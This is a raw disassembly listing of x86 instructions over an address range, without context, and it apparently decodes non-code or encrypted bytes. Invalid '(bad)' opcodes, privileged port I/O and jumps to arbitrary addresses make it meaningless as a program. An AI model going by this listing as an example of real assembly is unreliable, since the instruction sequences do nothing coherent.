  410967:	add    DWORD PTR [eax+0x2f],esp
  41096a:	lahf   
  41096b:	cmp    BYTE PTR [edx],al
  41096d:	inc    ecx
  41096e:	mov    ebp,0x604852e6
  410973:	xchg   edi,eax
  410974:	mov    ebx,0x870b4ef9
  410979:	mov    al,ds:0xc82af6a5
  41097e:	and    edx,DWORD PTR [esi]
  410980:	(bad)  
  410982:	inc    esi
  410983:	sbb    edx,eax
  410985:	adc    al,0x6d
  410987:	mov    eax,0xc041133a
  41098c:	add    eax,0x2bc385e1
  410991:	xchg   ebp,eax
  410992:	and    al,BYTE PTR [esi+0x78a4296]
  410998:	add    al,0x3c
  41099a:	sub    ah,BYTE PTR [bx]
  41099d:	movsx  ecx,BYTE PTR [edi-0x2e1daa64]
  4109a4:	icebp  
  4109a5:	xchg   edx,eax
  4109a6:	inc    ebp
  4109a7:	loop   0x410979
  4109a9:	pop    ds
  4109aa:	sbb    al,0x29
  4109ac:	sub    eax,0xa74bc79b
  4109b1:	cmp    DWORD PTR [ecx+0x30],ecx
  4109b4:	mov    esp,0x9fe5c8cd
  4109b9:	enter  0x757d,0x8b
  4109bd:	mov    ds:0xa9930525,al
  4109c2:	mov    ah,0xa9
  4109c4:	add    edi,esp
  4109c6:	shl    BYTE PTR [eax-0x3d7fab68],0x41
  4109cd:	fdivr  QWORD PTR [esp+ebx*8]
  4109d0:	ins    BYTE PTR es:[edi],dx
  4109d1:	(bad)  
  4109d3:	pop    ecx
  4109d4:	cmc    
  4109d5:	int3   
  4109d6:	cwde   
  4109d7:	lods   eax,DWORD PTR ds:[esi]
  4109d8:	retf   0xa698
  4109db:	sbb    esi,DWORD PTR [ecx+edi*2]
  4109de:	add    ebx,DWORD PTR [eax+0x3f]
  4109e1:	test   eax,0xd7c83feb
  4109e6:	jbe    0x410a61
  4109e8:	push   ds
  4109e9:	push   cs
  4109ea:	sti    
  4109eb:	pop    ecx
  4109ec:	ret    0xf088
  4109ef:	mov    WORD PTR [edx-0xd6e857c],ds
  4109f5:	lods   eax,DWORD PTR ds:[esi]
  4109f6:	mov    al,0x2b
  4109f8:	out    0x32,al
  4109fa:	pop    esi
  4109fb:	push   edi
  4109fc:	ss mov bl,0x6c
  4109ff:	gs iret 
  410a01:	push   eax
  410a02:	adc    al,0x59
  410a04:	push   ebp
  410a05:	retf   
  410a06:	dec    bx
  410a08:	rcr    DWORD PTR [ebp-0x51],1
  410a0b:	add    BYTE PTR [ebp+edx*4-0x59],0x65
  410a10:	rcr    BYTE PTR [edi],1
  410a12:	or     ah,BYTE PTR [edi+0x45]
  410a15:	inc    edx
  410a16:	ficom  DWORD PTR [edi+0xd]
  410a19:	or     BYTE PTR [edi+0xcf1321a],ch
  410a1f:	rcr    BYTE PTR [ebx-0x7c1f9270],1
  410a25:	or     esp,DWORD PTR [ebp+0x2a]
  410a28:	dec    esp
  410a29:	xchg   esi,ebx
  410a2b:	scas   al,BYTE PTR es:[edi]
  410a2c:	inc    esi
  410a2d:	mov    WORD PTR [esi+0x1f235d15],?
  410a33:	mov    BYTE PTR [ebp-0x742364e7],dl
  410a39:	cli    
  410a3a:	dec    eax
  410a3b:	push   es
  410a3c:	cli    
  410a3d:	or     DWORD PTR [edi+0x44769e3d],ebp
  410a43:	cmp    esp,ebx
  410a45:	xor    al,0x5
  410a47:	hlt    
  410a48:	loope  0x410a82
  410a4a:	sbb    al,0x5a
  410a4c:	mov    ebx,0x44b7ddd
  410a51:	out    0x61,eax
  410a53:	xchg   edx,eax
  410a54:	setbe  BYTE PTR [esi+esi*1+0x3da8298d]
  410a5c:	test   DWORD PTR [eax-0x1bbb7e57],ecx
  410a62:	mov    esp,0x559d8c3f
  410a67:	inc    eax
  410a68:	jp     0x410ab0
  410a6a:	cwde   
  410a6b:	call   0x314a90c
  410a70:	xor    dl,ch
  410a72:	mov    al,0x40
  410a74:	sbb    cl,0xa3
  410a77:	ror    DWORD PTR [eax-0x1d],cl
  410a7a:	mov    dl,BYTE PTR [ebx]
  410a7c:	mov    al,0x6d
  410a7e:	push   ebx
  410a7f:	add    eax,0x215861fb
  410a84:	sbb    DWORD PTR [edi-0x4331e817],esp
  410a8a:	or     BYTE PTR [eax],dh
  410a8c:	lods   eax,DWORD PTR ds:[esi]
  410a8d:	(bad)  
  410a8e:	push   esp
  410a8f:	fcom   DWORD PTR [esi+0x25722e59]
  410a95:	dec    eax
  410a96:	mov    ebp,0xfecb9d52
  410a9b:	data16 je 0x410acd
  410a9e:	xor    DWORD PTR [esi],0x93c1b49
  410aa4:	shl    BYTE PTR [eax],1
  410aa6:	mov    bh,0x13
  410aa8:	jmp    0x685293a2
  410aad:	outs   dx,DWORD PTR ds:[esi]
  410aae:	push   edx
  410aaf:	pop    ss
  410ab0:	adc    eax,DWORD PTR [eax]
  410ab2:	mov    esi,0x2330bed6
  410ab7:	out    dx,eax
  410ab8:	mov    esp,0x65d1feae
  410abd:	int3   
  410abe:	xor    eax,0x1e950747
  410ac3:	xchg   BYTE PTR [edi-0x52],ah
  410ac6:	idiv   DWORD PTR [ebx-0x6f]
  410ac9:	or     DWORD PTR [ecx],ebx
  410acb:	into   
  410acc:	fwait
  410acd:	adc    ebx,DWORD PTR [ebp+0x7c]
  410ad0:	adc    edi,DWORD PTR [ebp+0x5ff31f92]
  410ad6:	jns    0x410aac
  410ad8:	in     eax,0xc6
  410ada:	pop    esi
  410adb:	mov    edi,0x2bd04efb
  410ae0:	inc    edx
  410ae1:	rol    BYTE PTR [edi],cl
  410ae3:	and    al,0xb6
  410ae5:	mov    eax,0x9f860fc2
  410aea:	pop    eax
  410aeb:	add    esp,DWORD PTR [edx-0x24b5c731]
  410af1:	jecxz  0x410b02
  410af3:	mov    cl,BYTE PTR [edx+0x54a1fb6f]
  410af9:	pushf  
  410afa:	xor    ebx,DWORD PTR [edx-0x2cb3b6a7]
  410b00:	arpl   WORD PTR [ecx],bx
  410b02:	adc    dh,0xd5
  410b05:	mov    ebp,0x3bae7d2
  410b0a:	stos   BYTE PTR es:[edi],al
  410b0b:	out    0xdf,al
  410b0d:	dec    eax
  410b0e:	inc    esi
  410b0f:	mov    BYTE PTR [ecx+0xf],bl
  410b12:	sti    
  410b13:	ret    
  410b14:	sbb    cl,BYTE PTR [esi+0x9e96214]
  410b1a:	mov    BYTE PTR [eax-0x50],ah
  410b1d:	pop    DWORD PTR [ebx+0xd]
  410b20:	or     al,0x3
  410b22:	dec    esp
  410b23:	cmp    ebp,ebp
  410b25:	jmp    0x37869c44
  410b2a:	fcom   DWORD PTR [edi-0x164df2b8]
  410b30:	pop    ds
  410b31:	popa   
  410b32:	inc    edi
  410b33:	sahf   
  410b34:	mov    esp,ecx
  410b36:	pusha  
  410b37:	ret    
  410b38:	jecxz  0x410ac4
  410b3a:	add    al,0xa7
  410b3c:	bound  ebx,QWORD PTR [edi+0x2e472ba7]
  410b42:	fucom  st(3)
  410b44:	test   al,0x94
  410b46:	dec    eax
  410b47:	stos   DWORD PTR es:[edi],eax
  410b48:	inc    ebx
  410b49:	aad    0x49
  410b4b:	je     0x410b02
  410b4d:	leave  
  410b4e:	cmp    DWORD PTR [ebx+0x26a68095],ebp
  410b54:	xor    DWORD PTR [edx+0x6e],eax
  410b57:	cwde   
  410b58:	(bad)  
  410b59:	mov    ch,0xdc
  410b5b:	pop    esi
  410b5c:	ins    BYTE PTR es:[edi],dx
  410b5d:	jmp    0x410b2f
  410b5f:	push   eax
  410b60:	and    DWORD PTR [ebp-0x3e79abe7],0x2c
  410b67:	fs (bad) 
  410b6a:	mov    edi,0xe91f69d
  410b6f:	adc    al,0x6a
  410b71:	nop
  410b72:	dec    ecx
  410b73:	xor    ebx,DWORD PTR [ecx+0x4b]
  410b76:	push   esi
  410b77:	or     ah,BYTE PTR [ecx+0x11]
  410b7a:	js     0x410be4
  410b7c:	pop    ss
  410b7d:	mov    ss,WORD PTR [eax+ecx*8-0xba6c0a2]
  410b84:	or     ecx,ecx
  410b86:	adc    dl,BYTE PTR ds:0x82a6d7c1
  410b8c:	dec    esp
  410b8d:	sahf   
  410b8e:	xor    ebp,DWORD PTR [edi-0x7ab6db65]
  410b94:	inc    ecx
  410b95:	pop    ebp
  410b96:	in     al,0xcd
  410b98:	or     edi,ebp
  410b9a:	pop    ebx
  410b9b:	cmp    al,0x3f
  410b9d:	test   BYTE PTR [ebp+0x2fa7d3a2],0xd5
  410ba4:	and    eax,0xf9a8fb51
  410ba9:	dec    si
  410bab:	mov    ah,0xfd
  410bad:	call   FWORD PTR [ebx+0x78b28f05]
  410bb3:	stos   DWORD PTR es:[edi],eax
  410bb4:	jle    0x410b89
  410bb6:	sbb    eax,0x5add32f9
  410bbb:	(bad)  
  410bbc:	(bad)  
  410bbd:	std    
  410bbe:	not    BYTE PTR [esp+eax*4+0x4d]
  410bc2:	in     al,dx
  410bc3:	stos   DWORD PTR es:[edi],eax
  410bc4:	sbb    eax,DWORD PTR [eax-0x7ea09253]
  410bca:	sbb    al,0x36
  410bcc:	sar    BYTE PTR [eax],0xf4
  410bcf:	sub    bl,BYTE PTR [eax-0x7843a6ea]
  410bd5:	fldcw  WORD PTR [ebp+eiz*2+0x38375704]
  410bdc:	jle    0x410bb8
  410bde:	aaa    
  410bdf:	fimul  DWORD PTR [esi]
  410be1:	test   eax,0xcdd8deac
  410be6:	sar    DWORD PTR [esi+0x3542f53c],cl
  410bec:	(bad)  
  410bed:	adc    eax,0x2491dae5
  410bf2:	mov    al,BYTE PTR [ecx-0x73]
  410bf5:	test   DWORD PTR [ebx-0x96a82d4],ecx
  410bfb:	lea    ecx,[edx+0x7b]
  410bfe:	pop    edx
  410bff:	aaa    
  410c00:	jle    0x410bdb
  410c02:	fdivr  DWORD PTR [eax+ecx*1]
  410c05:	loopne 0x410c86
  410c07:	cmp    eax,0x9658bb56
  410c0c:	test   DWORD PTR [ebp-0x68c3d6d9],edx
  410c12:	mov    ds:0x64c2ad64,al
  410c17:	adc    eax,DWORD PTR [ecx]
  410c19:	(bad)  
  410c1a:	stos   BYTE PTR es:[edi],al
  410c1b:	jmp    0x410bfc
  410c1d:	xor    bh,BYTE PTR [edx+0x2087ae5e]
  410c23:	(bad)  
  410c24:	sahf   
  410c25:	ror    DWORD PTR [ebp-0x473ffdf2],0x79
  410c2c:	into   
  410c2d:	cmp    DWORD PTR [ebp+0x22eff76],ebx
  410c33:	sub    eax,0x31f73db3
  410c38:	in     eax,0x5b
  410c3a:	fiadd  DWORD PTR [edi-0x5f]
  410c3d:	mov    ah,0xff
  410c3f:	or     al,0x6e
  410c41:	sti    
  410c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c43:	push   ecx
  410c44:	test   ch,bl
  410c46:	int3   
  410c47:	aad    0xf2
  410c49:	sti    
  410c4a:	dec    edx
  410c4b:	lods   al,BYTE PTR ds:[esi]
  410c4c:	or     ah,bl
  410c4e:	fadd   QWORD PTR [eax-0x1134ceec]
  410c54:	push   ebx
  410c55:	adc    BYTE PTR ds:0x3c392846,ch
  410c5b:	mov    ds:0x2e897625,al
  410c60:	sub    bh,BYTE PTR es:[edi+0x4b738bd5]
  410c67:	add    BYTE PTR [edi-0x48],al
  410c6a:	cli    
  410c6b:	adc    eax,esi
  410c6d:	sbb    al,0xaf
  410c6f:	push   ebx
  410c70:	loopne 0x410c6c
  410c72:	sti    
  410c73:	xchg   BYTE PTR [esp+eax*1-0x48],ah
  410c77:	arpl   WORD PTR [bp+di+0x3546],cx
  410c7c:	ret    
  410c7d:	popf   
  410c7e:	jne    0x410cb6
  410c80:	adc    al,0x2e
  410c82:	mov    WORD PTR [esi+ebx*1+0x15],gs
  410c86:	jle    0x410c5e
  410c88:	aas    
  410c89:	ror    dl,cl
  410c8b:	cmp    DWORD PTR [esi-0x11],eax
  410c8e:	fdivr  QWORD PTR [eax]
  410c90:	loop   0x410c4d
  410c92:	cwde   
  410c93:	cwde   
  410c94:	sahf   
  410c95:	push   ds
  410c96:	shl    esi,1
  410c98:	sbb    bh,BYTE PTR [ebx+0x22a48df4]
  410c9e:	mov    ah,0x83
  410ca0:	test   DWORD PTR [ebx+edi*4],ecx
  410ca3:	sbb    dh,bl
  410ca5:	cmp    BYTE PTR [ebx],0xff
  410ca8:	pop    edi
  410ca9:	es jmp 0x410ccb
  410cac:	sub    dh,bh
  410cae:	sar    DWORD PTR [ebx+eax*1+0x311123f4],cl
  410cb5:	mov    ch,0xc2
  410cb7:	lea    ecx,cs:[ebx-0x1]
  410cbb:	xchg   ebp,eax
  410cbc:	cmc    
  410cbd:	push   ecx
  410cbe:	push   ds
  410cbf:	push   ebp
  410cc0:	dec    eax
  410cc1:	out    dx,al
  410cc2:	mov    BYTE PTR [edx+0x58b25317],al
  410cc8:	jle    0x410d02
  410cca:	and    al,0x10
  410ccc:	bound  ebx,QWORD PTR [esi]
  410cce:	lea    edi,[ecx]
  410cd0:	mov    dh,BYTE PTR [ebp-0x69]
  410cd3:	jne    0x410cb4
  410cd5:	(bad)  
  410cd6:	sar    BYTE PTR [ebx-0x38919c37],cl
  410cdc:	in     eax,0x9c
  410cde:	fwait
  410cdf:	push   ecx
  410ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ce1:	xor    BYTE PTR [ebx],cl
  410ce3:	mov    ebp,0x4f2572ae
  410ce8:	(bad)  
  410ce9:	clc    
  410cea:	xchg   ebp,eax
  410ceb:	retf   
  410cec:	neg    BYTE PTR [eax+0x31588dbc]
  410cf2:	jns    0x410cbb
  410cf4:	lds    edx,FWORD PTR [ebx+esi*1-0x28]
  410cf8:	scas   al,BYTE PTR es:[edi]
  410cf9:	inc    esi
  410cfa:	xor    al,0xf2
  410cfc:	arpl   WORD PTR [esi],bp
  410cfe:	lock sub BYTE PTR [esi+eiz*4+0x1d],cl
  410d03:	push   edi
  410d04:	sbb    edi,edx
  410d06:	enter  0x1cc3,0x25
  410d0a:	pop    ds
  410d0b:	(bad)  
  410d0c:	mov    ebx,0xa145854a
  410d11:	into   
  410d12:	adc    edi,DWORD PTR [ebx+esi*8]
  410d15:	neg    BYTE PTR [eax+ebp*1-0x3d82e916]
  410d1c:	repnz data16 sbb cl,BYTE PTR [ecx]
  410d20:	daa    
  410d21:	es cld 
  410d23:	pop    esi
  410d24:	inc    eax
  410d25:	mov    ah,0x90
  410d27:	popa   
  410d28:	cmp    dl,BYTE PTR [edx]
  410d2a:	(bad)  
  410d2b:	adc    al,BYTE PTR ds:0xd739708d
  410d31:	imul   esp,DWORD PTR [ebx-0xc],0xb1f7ed1f
  410d38:	retf   0x8c7d
  410d3b:	dec    esp
  410d3c:	iret   
  410d3d:	cmp    DWORD PTR [edi],eax
  410d3f:	and    al,0xb9
  410d41:	in     al,dx
  410d42:	ret    0x2183
  410d45:	cs scas eax,DWORD PTR es:[edi]
  410d47:	mov    al,0xe
  410d49:	push   edx
  410d4a:	(bad)  
  410d4b:	sbb    eax,0x7ffaea16
  410d50:	push   ebp
  410d51:	in     al,0xa8
  410d53:	cld    
  410d54:	popf   
  410d55:	add    dl,ch
  410d57:	retf   
  410d58:	push   edx
  410d59:	sti    
  410d5a:	cmp    al,0x7c
  410d5c:	(bad)  
  410d5e:	std    
  410d5f:	fwait
  410d60:	(bad)  
  410d63:	ja     0x410d31
  410d65:	jmp    0xb72a:0x3db13e81
  410d6c:	dec    ebp
  410d6d:	popa   
  410d6e:	(bad)  
  410d6f:	pop    ebp
  410d70:	mov    dh,0x62
  410d72:	mov    WORD PTR [edx-0x73],fs
  410d75:	adc    esi,DWORD PTR ds:0xd4d60ed2
  410d7b:	mov    cl,BYTE PTR [edi]
  410d7d:	ficom  DWORD PTR [edi-0x31]
  410d80:	dec    ebp
  410d81:	popf   
  410d82:	mov    cl,0x8b
  410d84:	fisubr WORD PTR [edi+0x7f]
  410d87:	add    BYTE PTR [edx],bl
  410d89:	cli    
  410d8a:	sbb    edi,DWORD PTR [eax-0x14]
  410d8d:	out    0x2a,al
  410d8f:	xor    dh,dh
  410d91:	daa    
  410d92:	or     DWORD PTR [ebx+0x46],edx
  410d95:	mov    DWORD PTR [edx],eax
  410d97:	sub    DWORD PTR [edi+edx*2+0x7a9cac0c],esi
  410d9e:	jg     0x410d8c
  410da0:	adc    eax,0xd6fc78e0
  410da5:	push   eax
  410da6:	mov    BYTE PTR [esi],0x17
  410da9:	rol    ch,1
  410dab:	aaa    
  410dac:	xchg   ecx,eax
  410dad:	pusha  
  410dae:	cwde   
  410daf:	sbb    al,0xa9
  410db1:	stc    
  410db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db3:	dec    esi
  410db4:	mov    al,BYTE PTR [esi]
  410db6:	push   edx
  410db7:	std    
  410db8:	shr    DWORD PTR [edx+0x72d85144],cl
  410dbe:	daa    
  410dbf:	es sub eax,0xc98c50cd
  410dc5:	adc    ch,BYTE PTR [ebx-0x2c6ef176]
  410dcb:	mov    cl,0x24
  410dcd:	mov    al,ds:0xb34a5037
  410dd2:	rol    dh,0x5e
  410dd5:	dec    eax
  410dd6:	fldcw  WORD PTR [ecx+0x25]
  410dd9:	sub    BYTE PTR [esp+ebp*4],ah
  410ddc:	inc    ebx
  410ddd:	nop
  410dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ddf:	or     bh,BYTE PTR ds:[edi+0x4847e5b1]
  410de6:	repz push cs
  410de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410de9:	test   DWORD PTR [eax+0x1687a565],ecx
  410def:	push   ecx
  410df0:	cmp    eax,0x992e91aa
  410df5:	test   BYTE PTR [esi],al
  410df7:	cmp    edx,edx
  410df9:	and    al,0xa4
  410dfb:	mov    eax,0x85abac37
  410e00:	xchg   esp,eax
  410e01:	inc    esi
  410e02:	jle    0x410e57
  410e04:	push   esi
  410e05:	and    DWORD PTR ds:0x3eeb8352,ebx
  410e0b:	aaa    
  410e0c:	ds inc ebx
  410e0e:	jb     0x410e7c
  410e10:	outs   dx,DWORD PTR ds:[esi]
  410e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e12:	sub    DWORD PTR [esp+ebx*8-0x51],ecx
  410e16:	or     ecx,DWORD PTR [edx+0x6c752180]
  410e1c:	and    bh,BYTE PTR [edx]
  410e1e:	in     al,0x45
  410e20:	cwde   
  410e21:	aaa    
  410e22:	mov    ch,0x82
  410e24:	ror    esp,1
  410e26:	pop    ebp
  410e27:	les    edx,FWORD PTR [eax+edi*2]
  410e2a:	imul   eax,ebp,0x92b80565
  410e30:	repz jecxz 0x410eb2
  410e33:	push   0x2d1ce54a
  410e38:	test   BYTE PTR [esi+0x69],0x39
  410e3c:	pop    edi
  410e3d:	xchg   ebp,eax
  410e3e:	xchg   ecx,eax
  410e3f:	jne    0x410df9
  410e41:	(bad)  
  410e42:	pusha  
  410e43:	inc    edi
  410e44:	mov    fs,WORD PTR [bp+si+0x27]
  410e48:	cmp    edi,esi
  410e4a:	pop    ecx
  410e4b:	ret    0x5a4c
  410e4e:	push   eax
  410e4f:	jns    0x410e50
  410e51:	jbe    0x410df8
  410e53:	stc    
  410e54:	jb     0x410de2
  410e56:	ss jp  0x410e67
  410e59:	(bad)
  410e5d:	fcmovu st,st(6)
  410e5f:	push   ebx
  410e60:	imul   esi,DWORD PTR [edi+0x38702214],0x1211087f
  410e6a:	jne    0x410e44
  410e6c:	scas   al,BYTE PTR es:[edi]
  410e6d:	sbb    BYTE PTR [esi],bh
  410e6f:	xor    DWORD PTR [ebp-0x4c7b695],ecx
  410e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e76:	in     eax,dx
  410e77:	lods   al,BYTE PTR ds:[esi]
  410e78:	call   0x21029ac5
  410e7d:	xchg   ebx,eax
  410e7e:	jp     0x410eed
  410e80:	or     dh,BYTE PTR [eax-0x5bc97285]
  410e86:	ror    ch,0xa5
  410e89:	mov    ch,0x3
  410e8b:	fidiv  WORD PTR [ecx+0x52e66bfe]
  410e91:	jmp    0x410e60
  410e93:	or     eax,0xda61f533
  410e99:	loopne 0x410ed2
  410e9b:	sbb    eax,0x9555e5d7
  410ea0:	loopne 0x410e9a
  410ea2:	(bad)
  410ea5:	xor    esp,DWORD PTR [esi+0x1283f097]
  410eab:	mov    eax,0x76193800
  410eb0:	(bad)  
  410eb1:	jmp    0xb01a:0x5c0112c7
  410eb8:	in     eax,0xe8
  410eba:	jp     0x410ed8
  410ebc:	inc    ecx
  410ebd:	xchg   edi,eax
  410ebf:	inc    edi
  410ec0:	push   es
  410ec1:	gs dec edx
  410ec3:	pop    ds
  410ec4:	stos   DWORD PTR es:[edi],eax
  410ec5:	aaa    
  410ec6:	aas    
  410ec7:	retf   0x9618
  410eca:	shr    WORD PTR [esi],cl
  410ecd:	push   esi
  410ece:	and    esp,0xffffffd1
  410ed1:	push   es
  410ed2:	cli    
  410ed3:	sbb    al,0xe4
  410ed5:	jmp    0xf1e3db25
  410eda:	std    
  410edb:	mov    eax,0x5c7a41f
  410ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee2:	lods   eax,DWORD PTR ds:[esi]
  410ee3:	xor    eax,0xa1c1f2f7
  410ee8:	pushf  
  410ee9:	lahf   
  410eea:	pusha  
  410eeb:	jae    0x410f15
  410eed:	idiv   BYTE PTR [edi+0x77]
  410ef0:	mov    ?,WORD PTR [edx+0x5aa561e4]
  410ef6:	xchg   ecx,eax
  410ef7:	lock cwde 
  410ef9:	mov    eax,0xfc991492
  410efe:	clc    
  410eff:	test   al,0x55
  410f01:	test   BYTE PTR [ecx+0x25],bl
  410f04:	mov    ss,WORD PTR [eax]
  410f06:	push   ss
  410f07:	fsubr  st,st(4)
  410f09:	(bad)  
  410f0b:	cmp    ecx,DWORD PTR [ebp+0x3426e269]
  410f11:	jl     0x410f35
  410f13:	stos   BYTE PTR es:[edi],al
  410f14:	leave  
  410f15:	ror    DWORD PTR [ebx+0x3cb55c52],cl
  410f1b:	mov    ebp,0x6ba3dd0f
  410f20:	cwde   
  410f21:	adc    BYTE PTR [ebp+edx*2-0x6a],0x4c
  410f26:	sbb    BYTE PTR [ebx],ch
  410f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f2a:	loopne 0x410ef5
  410f2c:	jo     0x410f8f
  410f2e:	mov    edx,0x9fde88c1
  410f33:	shl    esi,cl
  410f35:	dec    ecx
  410f36:	mov    ds:0xcf626c63,eax
  410f3b:	pop    esi
  410f3c:	lea    ebp,[ecx+esi*4-0x59898b81]
  410f43:	mov    ah,BYTE PTR [edi+0x41563665]
  410f49:	(bad)  ds:0x23a15b2a
  410f4f:	rcr    BYTE PTR [ebp-0x4f45c680],0x81
  410f56:	outs   dx,DWORD PTR ds:[esi]
  410f57:	push   0x55
  410f59:	ins    DWORD PTR es:[edi],dx
  410f5a:	(bad)  
  410f5c:	inc    ebx
  410f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f5e:	jb     0x410fc4
  410f60:	cs pop ebx
  410f62:	xchg   bh,bl
  410f64:	add    bh,ah
  410f66:	imul   esp,DWORD PTR ds:0x314de620,0xffffff8f
  410f6d:	arpl   WORD PTR [esi+esi*8],cx
  410f70:	lds    ebp,FWORD PTR [ebx-0x7cd9c487]
  410f76:	dec    eax
  410f77:	rcr    BYTE PTR [edi+esi*8-0x4810268],1
  410f7e:	mov    bh,0xbc
  410f80:	js     0x410fd0
  410f82:	mov    ds:0x2fc96c1a,al
  410f87:	stos   DWORD PTR es:[edi],eax
  410f88:	sti    
  410f89:	scas   eax,DWORD PTR es:[edi]
  410f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f8b:	mov    BYTE PTR [esi+eiz*1-0x4ee684b3],al
  410f92:	retf   
  410f93:	adc    eax,0x81121e93
  410f98:	pushf  
  410f99:	cmc    
  410f9a:	je     0x410ff1
  410f9c:	sub    BYTE PTR [edi+0x48d9c6b2],0xfd
  410fa3:	jmp    0x410f67
  410fa5:	hlt    
  410fa6:	adc    eax,0xca052df6
  410fab:	(bad)
  410faf:	enter  0xab49,0x85
  410fb3:	lods   al,BYTE PTR ds:[esi]
  410fb4:	cmp    BYTE PTR [edx+0x1b76e78c],al
  410fba:	out    0x4f,al
  410fbc:	retf   0xdd34
  410fbf:	jns    0x410fd7
  410fc1:	xchg   ebp,eax
  410fc2:	(bad)  [ebp+0x7e89f1]
  410fc8:	xchg   ebx,eax
  410fc9:	pop    ds
  410fca:	mov    ecx,0x1c34469e
  410fcf:	out    0x54,eax
  410fd1:	and    DWORD PTR [edx+ebx*8+0x5ffe937a],ecx
  410fd8:	add    bh,BYTE PTR [edi]
  410fda:	clc    
  410fdb:	mov    WORD PTR [edi],?
  410fdd:	mov    esp,0x8036df1d
  410fe2:	sub    BYTE PTR [ebp+0x7c51977],dh
  410fe8:	pop    ecx
  410fe9:	and    al,0x96
  410feb:	sbb    ebx,eax
  410fed:	and    eax,0xa5e4d8f
  410ff2:	icebp  
  410ff3:	fidivr WORD PTR [ebp-0x631baa22]
  410ff9:	sbb    DWORD PTR [ecx-0x53],esi
  410ffc:	push   ecx
  410ffd:	rcl    DWORD PTR [ebx+ecx*1-0x7f],cl
  411001:	retf   0x85fe
  411004:	mov    bl,0xde
  411006:	inc    eax
  411007:	jns    0x41105e
  411009:	out    0x37,eax
  41100b:	in     al,0x3
  41100d:	lahf   
  41100e:	enter  0x3dfc,0xa8
  411012:	sar    esi,0x6e
  411015:	fidivr DWORD PTR [edx]
  411017:	xchg   ebp,ebp
  411019:	and    eax,0x98c17b0c
  41101e:	je     0x410fa2
  411020:	ja     0x411057
  411022:	inc    edx
  411023:	stos   DWORD PTR es:[edi],eax
  411024:	sub    al,0x4f
  411026:	cmp    BYTE PTR [eax],ah
  411028:	mov    al,ds:0xc702abd7
  41102d:	scas   eax,DWORD PTR es:[edi]
  41102e:	sub    al,0x70
  411030:	aam    0x72
  411032:	rcl    BYTE PTR [ecx+0x5f679b79],0xd1
  411039:	lods   al,BYTE PTR ds:[esi]
  41103a:	push   0x74
  41103c:	jmp    0x7fac310a
  411041:	dec    edi
  411042:	mov    al,0xb3
  411044:	rol    BYTE PTR ds:0x4de7d3fe,cl
  41104a:	sub    BYTE PTR [esi],ah
  41104c:	mov    eax,ds:0x65b8f779
  411051:	jmp    0x395d2fed
  411056:	cdq    
  411057:	pushf  
  411058:	pop    ebx
  411059:	sub    bl,dl
  41105b:	repz push eax
  41105d:	xchg   edi,eax
  41105e:	out    dx,eax
  41105f:	loopne 0x411056
  411061:	cmp    DWORD PTR [edx+0x12],esp
  411064:	dec    ecx
  411065:	outs   dx,BYTE PTR ss:[esi]
  411067:	icebp  
  411068:	xchg   esp,eax
  411069:	xchg   ecx,eax
  41106a:	adc    eax,0xad786222
  41106f:	mul    DWORD PTR [edi+0x61a60bbb]
  411075:	ficom  WORD PTR [edi]
  411077:	xchg   ecx,eax
  411078:	(bad)  
  411079:	jecxz  0x4110af
  41107b:	shl    DWORD PTR [ecx-0x7c],0x15
  41107f:	pusha  
  411080:	mov    ds:0xcd340477,eax
  411085:	js     0x41103a
  411087:	(bad)  
  411088:	fst    DWORD PTR [esi+0x45]
  41108b:	add    DWORD PTR [edi-0x58],esp
  41108e:	pop    ds
  41108f:	icebp  
  411090:	aam    0xf0
  411092:	pop    edx
  411093:	dec    edx
  411094:	jp     0x4110c4
  411096:	sub    al,0xd4
  411098:	jne    0x4110ef
  41109a:	sub    ebp,DWORD PTR [esi-0x29]
  41109d:	in     eax,dx
  41109e:	fsub   DWORD PTR [ebx-0x4a]
  4110a1:	xchg   esi,eax
  4110a2:	inc    ebp
  4110a3:	popf   
  4110a4:	mov    dl,0xa6
  4110a6:	dec    edi
  4110a7:	scas   eax,DWORD PTR es:[edi]
  4110a8:	hlt    
  4110a9:	jns    0x4110c1
  4110ab:	xchg   ebx,eax
  4110ac:	iret   
  4110ad:	in     eax,dx
  4110ae:	xchg   ebp,eax
  4110af:	jmp    0x72ba:0xf8dba7ab
  4110b6:	dec    esp
  4110b7:	sub    eax,0x75480eb5
  4110bc:	shl    BYTE PTR [ebp-0x65],1
  4110bf:	lea    esi,[eax]
  4110c1:	push   0x4
  4110c3:	icebp  
  4110c4:	mov    ds:0x48d2505e,eax
  4110c9:	aad    0xd0
  4110cb:	(bad)  
  4110cc:	mov    ebx,0xf96f92a0
  4110d1:	adc    eax,eax
  4110d3:	imul   edi,DWORD PTR [edi-0x6b0bbe66],0xffffffc9
  4110da:	rcl    cl,1
  4110dc:	jne    0x4110b2
  4110de:	adc    edi,edx
  4110e0:	hlt    
  4110e1:	inc    eax
  4110e2:	xchg   DWORD PTR [eax+esi*2-0x1aac6d5c],esi
  4110e9:	pop    ebp
  4110ea:	cdq    
  4110eb:	jp     0x411133
  4110ed:	dec    edi
  4110ee:	ja     0x411085
  4110f0:	jne    0x41110e
  4110f2:	sahf   
  4110f3:	in     al,dx
  4110f4:	mov    ds:0xeb98719,al
  4110f9:	adc    bl,BYTE PTR [eax-0x795991e]
  4110ff:	stos   DWORD PTR es:[edi],eax
  411100:	bound  ebx,QWORD PTR [edx+eax*2]
  411103:	jl     0x4110e9
  411105:	neg    BYTE PTR [ebx-0x78]
  411108:	out    0xd6,eax
  41110a:	lods   al,BYTE PTR ds:[esi]
  41110b:	call   0x8ba8:0xf420c153
  411112:	fs xchg ebp,eax
  411114:	gs pop esp
  411116:	test   DWORD PTR [esi+esi*1],ecx
  411119:	scas   al,BYTE PTR es:[edi]
  41111a:	xor    dl,BYTE PTR [esi+0x4]
